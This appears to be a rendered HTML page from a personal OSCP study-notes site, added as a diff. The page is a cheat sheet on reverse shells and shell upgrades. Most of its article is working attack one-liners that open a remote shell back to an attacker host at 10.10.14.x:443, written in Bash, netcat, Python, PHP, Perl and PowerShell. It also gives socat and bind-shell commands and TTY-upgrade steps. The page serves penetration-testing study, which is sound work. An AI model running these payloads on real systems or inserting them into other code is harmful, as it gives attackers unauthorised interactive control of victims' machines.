@@ -1,0 +1,359 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Notes — Reverse Shells & Shell Upgrades — Shruthi Poojari | OSCP Notes</title>
+  <link rel="stylesheet" href="/oscp_learning/static/style.css">
+  <style>pre { line-height: 125%; }
+td.linenos .normal { color: inherit; background-color: transparent; padding-left: 5px; padding-right: 5px; }
+span.linenos { color: inherit; background-color: transparent; padding-left: 5px; padding-right: 5px; }
+td.linenos .special { color: #000000; background-color: #ffffc0; padding-left: 5px; padding-right: 5px; }
+span.linenos.special { color: #000000; background-color: #ffffc0; padding-left: 5px; padding-right: 5px; }
+.codehilite .hll { background-color: #49483e }
+.codehilite { background: #272822; color: #F8F8F2 }
+.codehilite .c { color: #959077 } /* Comment */
+.codehilite .err { color: #ED007E; background-color: #1E0010 } /* Error */
+.codehilite .esc { color: #F8F8F2 } /* Escape */
+.codehilite .g { color: #F8F8F2 } /* Generic */
+.codehilite .k { color: #66D9EF } /* Keyword */
+.codehilite .l { color: #AE81FF } /* Literal */
+.codehilite .n { color: #F8F8F2 } /* Name */
+.codehilite .o { color: #FF4689 } /* Operator */
+.codehilite .x { color: #F8F8F2 } /* Other */
+.codehilite .p { color: #F8F8F2 } /* Punctuation */
+.codehilite .ch { color: #959077 } /* Comment.Hashbang */
+.codehilite .cm { color: #959077 } /* Comment.Multiline */
+.codehilite .cp { color: #959077 } /* Comment.Preproc */
+.codehilite .cpf { color: #959077 } /* Comment.PreprocFile */
+.codehilite .c1 { color: #959077 } /* Comment.Single */
+.codehilite .cs { color: #959077 } /* Comment.Special */
+.codehilite .gd { color: #FF4689 } /* Generic.Deleted */
+.codehilite .ge { color: #F8F8F2; font-style: italic } /* Generic.Emph */
+.codehilite .ges { color: #F8F8F2; font-weight: bold; font-style: italic } /* Generic.EmphStrong */
+.codehilite .gr { color: #FF4689 } /* Generic.Error */
+.codehilite .gh { color: #F8F8F2 } /* Generic.Heading */
+.codehilite .gi { color: #A6E22E } /* Generic.Inserted */
+.codehilite .go { color: #66D9EF } /* Generic.Output */
+.codehilite .gp { color: #FF4689; font-weight: bold } /* Generic.Prompt */
+.codehilite .gs { color: #F8F8F2; font-weight: bold } /* Generic.Strong */
+.codehilite .gu { color: #959077 } /* Generic.Subheading */
+.codehilite .gt { color: #66D9EF } /* Generic.Traceback */
+.codehilite .kc { color: #66D9EF } /* Keyword.Constant */
+.codehilite .kd { color: #66D9EF } /* Keyword.Declaration */
+.codehilite .kn { color: #FF4689 } /* Keyword.Namespace */
+.codehilite .kp { color: #66D9EF } /* Keyword.Pseudo */
+.codehilite .kr { color: #66D9EF } /* Keyword.Reserved */
+.codehilite .kt { color: #66D9EF } /* Keyword.Type */
+.codehilite .ld { color: #E6DB74 } /* Literal.Date */
+.codehilite .m { color: #AE81FF } /* Literal.Number */
+.codehilite .s { color: #E6DB74 } /* Literal.String */
+.codehilite .na { color: #A6E22E } /* Name.Attribute */
+.codehilite .nb { color: #A6E22E } /* Name.Builtin */
+.codehilite .nc { color: #A6E22E } /* Name.Class */
+.codehilite .no { color: #66D9EF } /* Name.Constant */
+.codehilite .nd { color: #A6E22E } /* Name.Decorator */
+.codehilite .ni { color: #F8F8F2 } /* Name.Entity */
+.codehilite .ne { color: #A6E22E } /* Name.Exception */
+.codehilite .nf { color: #A6E22E } /* Name.Function */
+.codehilite .nl { color: #F8F8F2 } /* Name.Label */
+.codehilite .nn { color: #F8F8F2 } /* Name.Namespace */
+.codehilite .nx { color: #A6E22E } /* Name.Other */
+.codehilite .py { color: #F8F8F2 } /* Name.Property */
+.codehilite .nt { color: #FF4689 } /* Name.Tag */
+.codehilite .nv { color: #F8F8F2 } /* Name.Variable */
+.codehilite .ow { color: #FF4689 } /* Operator.Word */
+.codehilite .pm { color: #F8F8F2 } /* Punctuation.Marker */
+.codehilite .w { color: #F8F8F2 } /* Text.Whitespace */
+.codehilite .mb { color: #AE81FF } /* Literal.Number.Bin */
+.codehilite .mf { color: #AE81FF } /* Literal.Number.Float */
+.codehilite .mh { color: #AE81FF } /* Literal.Number.Hex */
+.codehilite .mi { color: #AE81FF } /* Literal.Number.Integer */
+.codehilite .mo { color: #AE81FF } /* Literal.Number.Oct */
+.codehilite .sa { color: #E6DB74 } /* Literal.String.Affix */
+.codehilite .sb { color: #E6DB74 } /* Literal.String.Backtick */
+.codehilite .sc { color: #E6DB74 } /* Literal.String.Char */
+.codehilite .dl { color: #E6DB74 } /* Literal.String.Delimiter */
+.codehilite .sd { color: #E6DB74 } /* Literal.String.Doc */
+.codehilite .s2 { color: #E6DB74 } /* Literal.String.Double */
+.codehilite .se { color: #AE81FF } /* Literal.String.Escape */
+.codehilite .sh { color: #E6DB74 } /* Literal.String.Heredoc */
+.codehilite .si { color: #E6DB74 } /* Literal.String.Interpol */
+.codehilite .sx { color: #E6DB74 } /* Literal.String.Other */
+.codehilite .sr { color: #E6DB74 } /* Literal.String.Regex */
+.codehilite .s1 { color: #E6DB74 } /* Literal.String.Single */
+.codehilite .ss { color: #E6DB74 } /* Literal.String.Symbol */
+.codehilite .bp { color: #A6E22E } /* Name.Builtin.Pseudo */
+.codehilite .fm { color: #A6E22E } /* Name.Function.Magic */
+.codehilite .vc { color: #F8F8F2 } /* Name.Variable.Class */
+.codehilite .vg { color: #F8F8F2 } /* Name.Variable.Global */
+.codehilite .vi { color: #F8F8F2 } /* Name.Variable.Instance */
+.codehilite .vm { color: #F8F8F2 } /* Name.Variable.Magic */
+.codehilite .il { color: #AE81FF } /* Literal.Number.Integer.Long */</style>
+  <script>
+    // Set theme before paint to avoid a flash of the wrong theme.
+    (function () {
+      var saved = localStorage.getItem('theme');
+      var theme = saved || (window.matchMedia('(prefers-color-scheme: light)').matches ? 'light' : 'dark');
+      document.documentElement.setAttribute('data-theme', theme);
+    })();
+  </script>
+</head>
+<body>
+  <aside class="sidebar">
+    <a class="brand" href="/oscp_learning/index.html">Shruthi&nbsp;Poojari<span class="brand-sub">OSCP Notes &amp; Machines</span></a>
+    <input id="filter" type="search" placeholder="Filter notes…" autocomplete="off">
+    <nav>
+      
+      <div class="group">
+        <h3>General</h3>
+        <ul>
+          
+          <li>
+            <a class=""
+               href="/oscp_learning/OSCP-Methodology.md.html">OSCP Methodology — Master Guide</a>
+          </li>
+          
+          <li>
+            <a class=""
+               href="/oscp_learning/README.md.html">OSCP Prep Repository</a>
+          </li>
+          
+        </ul>
+      </div>
+      
+      <div class="group">
+        <h3>Notes</h3>
+        <ul>
+          
+          <li>
+            <a class=""
+               href="/oscp_learning/Notes/DNS.md.html">Notes — DNS (53)</a>
+          </li>
+          
+          <li>
+            <a class=""
+               href="/oscp_learning/Notes/FTP.md.html">Notes — FTP (21)</a>
+          </li>
+          
+          <li>
+            <a class=""
+               href="/oscp_learning/Notes/File-Transfer.md.html">Notes — File Transfer</a>
+          </li>
+          
+          <li>
+            <a class=""
+               href="/oscp_learning/Notes/HTTP.md.html">Notes — HTTP / HTTPS (80 / 443 / 8080 / 8443)</a>
+          </li>
+          
+          <li>
+            <a class=""
+               href="/oscp_learning/Notes/LDAP.md.html">Notes — LDAP (389 / 636)</a>
+          </li>
+          
+          <li>
+            <a class=""
+               href="/oscp_learning/Notes/MSSQL.md.html">Notes — MSSQL (1433)</a>
+          </li>
+          
+          <li>
+            <a class=""
+               href="/oscp_learning/Notes/Metasploit.md.html">Notes — Metasploit Framework</a>
+          </li>
+          
+          <li>
+            <a class=""
+               href="/oscp_learning/Notes/Nmap.md.html">Notes — Nmap</a>
+          </li>
+          
+          <li>
+            <a class=""
+               href="/oscp_learning/Notes/PrivEsc.md.html">Notes — Privilege Escalation</a>
+          </li>
+          
+          <li>
+            <a class="active"
+               href="/oscp_learning/Notes/Reverse-Shells.md.html">Notes — Reverse Shells & Shell Upgrades</a>
+          </li>
+          
+          <li>
+            <a class=""
+               href="/oscp_learning/Notes/SMB.md.html">Notes — SMB (139 / 445)</a>
+          </li>
+          
+          <li>
+            <a class=""
+               href="/oscp_learning/Notes/WinRM.md.html">Notes — WinRM (5985 / 5986)</a>
+          </li>
+          
+          <li>
+            <a class=""
+               href="/oscp_learning/Notes/References.md.html">OSCP — References & Resources</a>
+          </li>
+          
+        </ul>
+      </div>
+      
+      <div class="group">
+        <h3>HTB Machines</h3>
+        <ul>
+          
+          <li>
+            <a class=""
+               href="/oscp_learning/HTB/Enigma.md.html">HTB — Enigma</a>
+          </li>
+          
+          <li>
+            <a class=""
+               href="/oscp_learning/HTB/Lame.md.html">HTB — Lame</a>
+          </li>
+          
+          <li>
+            <a class=""
+               href="/oscp_learning/HTB/Legacy.md.html">HTB — Legacy</a>
+          </li>
+          
+        </ul>
+      </div>
+      
+      <div class="group">
+        <h3>Samples</h3>
+        <ul>
+          
+          <li>
+            <a class=""
+               href="/oscp_learning/HTB/samples/Lame-7h3rAm-writeup.md.html">Lame-7h3rAm-writeup</a>
+          </li>
+          
+          <li>
+            <a class=""
+               href="/oscp_learning/HTB/samples/Legacy-7h3rAm-writeup.md.html">Legacy-7h3rAm-writeup</a>
+          </li>
+          
+        </ul>
+      </div>
+      
+    </nav>
+  </aside>
+
+  <main>
+    <header class="topbar">
+      <a class="topbar-brand" href="/oscp_learning/index.html">
+        <span class="dot"></span> OSCP Notes <b>&amp; Machines</b>
+      </a>
+      <nav class="topbar-links">
+        <a href="/oscp_learning/OSCP-Methodology.md.html">Methodology</a>
+        <a href="/oscp_learning/Notes/Nmap.md.html">Notes</a>
+        <a href="/oscp_learning/HTB/Lame.md.html">Machines</a>
+        
+        <a href="https://github.com/Shruthi-Poojari/oscp_learning" target="_blank" rel="noopener" class="icon-link" title="GitHub repository">GitHub <span class="ext">↗</span></a>
+        
+        <button id="theme-toggle" type="button" title="Toggle light/dark" aria-label="Toggle theme">
+          <span class="icon-dark">🌙</span><span class="icon-light">☀️</span>
+        </button>
+      </nav>
+    </header>
+    <div class="crumbs-strip">
+      <span class="crumb-group">Notes</span>
+      <span class="crumb-sep">›</span>
+      <span class="crumb-page">Notes — Reverse Shells & Shell Upgrades</span>
+    </div>
+    <article class="markdown-body">
+      <h1 id="notes-reverse-shells-shell-upgrades">Notes — Reverse Shells &amp; Shell Upgrades</h1>
+<blockquote>
+<p>Authorized lab/OSCP use only. Ref: sushant747 Total OSCP Guide — Spawning shells.</p>
+</blockquote>
+<h2 id="listener-attacker-side">Listener (attacker side)</h2>
+<div class="codehilite"><pre><span></span><code>nc<span class="w"> </span>-lvnp<span class="w"> </span><span class="m">443</span>
+rlwrap<span class="w"> </span>nc<span class="w"> </span>-lvnp<span class="w"> </span><span class="m">443</span><span class="w">        </span><span class="c1"># arrow keys / history in the caught shell</span>
+</code></pre></div>
+
+<h2 id="reverse-shell-one-liners-victim-side">Reverse Shell One-liners (victim side)</h2>
+<h3 id="bash">Bash</h3>
+<div class="codehilite"><pre><span></span><code>bash<span class="w"> </span>-i<span class="w"> </span>&gt;<span class="p">&amp;</span><span class="w"> </span>/dev/tcp/10.10.14.x/443<span class="w"> </span><span class="m">0</span>&gt;<span class="p">&amp;</span><span class="m">1</span>
+</code></pre></div>
+
+<h3 id="netcat">Netcat</h3>
+<div class="codehilite"><pre><span></span><code>nc<span class="w"> </span>-e<span class="w"> </span>/bin/sh<span class="w"> </span><span class="m">10</span>.10.14.x<span class="w"> </span><span class="m">443</span>
+<span class="c1"># no -e support:</span>
+rm<span class="w"> </span>/tmp/f<span class="p">;</span>mkfifo<span class="w"> </span>/tmp/f<span class="p">;</span>cat<span class="w"> </span>/tmp/f<span class="p">|</span>/bin/sh<span class="w"> </span>-i<span class="w"> </span><span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span><span class="p">|</span>nc<span class="w"> </span><span class="m">10</span>.10.14.x<span class="w"> </span><span class="m">443</span><span class="w"> </span>&gt;/tmp/f
+</code></pre></div>
+
+<h3 id="python">Python</h3>
+<div class="codehilite"><pre><span></span><code>python<span class="w"> </span>-c<span class="w"> </span><span class="s1">'import socket,subprocess,os;s=socket.socket();s.connect(("10.10.14.x",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'</span>
+</code></pre></div>
+
+<h3 id="php">PHP</h3>
+<div class="codehilite"><pre><span></span><code><span class="x">php -r '$s=fsockopen("10.10.14.x",443);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</span>
+</code></pre></div>
+
+<h3 id="perl">Perl</h3>
+<div class="codehilite"><pre><span></span><code><span class="n">perl</span><span class="w"> </span><span class="o">-</span><span class="n">e</span><span class="w"> </span><span class="s">'use Socket;$i="10.10.14.x";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");};'</span>
+</code></pre></div>
+
+<h3 id="powershell-windows">PowerShell (Windows)</h3>
+<div class="codehilite"><pre><span></span><code><span class="n">powershell</span> <span class="n">-nop</span> <span class="n">-c</span> <span class="s2">"$c=New-Object System.Net.Sockets.TCPClient('10.10.14.x',443);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2&gt;&amp;1|Out-String);$s2=$r+'PS '+(pwd).Path+'&gt; ';$sb=([text.encoding]::ASCII).GetBytes($s2);$s.Write($sb,0,$sb.Length);$s.Flush()}"</span>
+</code></pre></div>
+
+<h2 id="tty-shell-upgrade-linux">TTY / Shell Upgrade (Linux)</h2>
+<div class="codehilite"><pre><span></span><code><span class="c1"># 1) spawn a pty</span>
+python3<span class="w"> </span>-c<span class="w"> </span><span class="s1">'import pty;pty.spawn("/bin/bash")'</span>
+<span class="c1"># 2) background with Ctrl+Z, then on attacker:</span>
+stty<span class="w"> </span>raw<span class="w"> </span>-echo<span class="p">;</span><span class="w"> </span><span class="nb">fg</span>
+<span class="c1"># 3) back in the shell:</span>
+<span class="nb">export</span><span class="w"> </span><span class="nv">TERM</span><span class="o">=</span>xterm
+stty<span class="w"> </span>rows<span class="w"> </span><span class="m">38</span><span class="w"> </span>columns<span class="w"> </span><span class="m">116</span><span class="w">      </span><span class="c1"># match your terminal (check with `stty -a` locally)</span>
+</code></pre></div>
+
+<p>Alternatives to spawn a pty: <code>script /dev/null -c bash</code>, <code>socat</code>.</p>
+<h2 id="socat-fully-interactive">socat (fully interactive)</h2>
+<div class="codehilite"><pre><span></span><code><span class="c1"># attacker</span>
+socat<span class="w"> </span>file:<span class="sb">`</span>tty<span class="sb">`</span>,raw,echo<span class="o">=</span><span class="m">0</span><span class="w"> </span>tcp-listen:443
+<span class="c1"># victim</span>
+socat<span class="w"> </span>exec:<span class="s1">'bash -li'</span>,pty,stderr,setsid,sigint,sane<span class="w"> </span>tcp:10.10.14.x:443
+</code></pre></div>
+
+<h2 id="bind-shell-when-egress-is-filtered">Bind Shell (when egress is filtered)</h2>
+<div class="codehilite"><pre><span></span><code><span class="c1"># victim listens</span>
+nc<span class="w"> </span>-lvnp<span class="w"> </span><span class="m">4444</span><span class="w"> </span>-e<span class="w"> </span>/bin/sh
+<span class="c1"># attacker connects</span>
+nc<span class="w"> </span><span class="m">10</span>.10.10.x<span class="w"> </span><span class="m">4444</span>
+</code></pre></div>
+
+<h2 id="common-mistakes">Common Mistakes</h2>
+<ul>
+<li>Wrong LHOST — use the <strong>VPN (<code>tun0</code>) IP</strong>, not your LAN IP.</li>
+<li>Forgetting to start the listener before triggering the shell.</li>
+<li>Not upgrading to a TTY → Ctrl+C kills the shell, no tab-complete, <code>sudo</code>/<code>su</code> fail.</li>
+</ul>
+<h2 id="oscp-tips">OSCP Tips</h2>
+<ul>
+<li>Keep a listener template ready: <code>rlwrap nc -lvnp 443</code>.</li>
+<li>Always upgrade to a full TTY before attempting privesc (interactive <code>sudo</code>/<code>su</code> need it).</li>
+<li>Have 2–3 payload languages memorized — the victim may lack <code>nc -e</code> or python.</li>
+</ul>
+    </article>
+  </main>
+
+  <script>
+    const toggle = document.getElementById('theme-toggle');
+    toggle.addEventListener('click', () => {
+      const next = document.documentElement.getAttribute('data-theme') === 'light' ? 'dark' : 'light';
+      document.documentElement.setAttribute('data-theme', next);
+      localStorage.setItem('theme', next);
+    });
+
+    const filter = document.getElementById('filter');
+    filter.addEventListener('input', () => {
+      const q = filter.value.toLowerCase();
+      document.querySelectorAll('.sidebar li').forEach(li => {
+        li.style.display = li.textContent.toLowerCase().includes(q) ? '' : 'none';
+      });
+      document.querySelectorAll('.group').forEach(g => {
+        const any = [...g.querySelectorAll('li')].some(li => li.style.display !== 'none');
+        g.style.display = any ? '' : 'none';
+      });
+    });
+  </script>
+</body>
+</html>
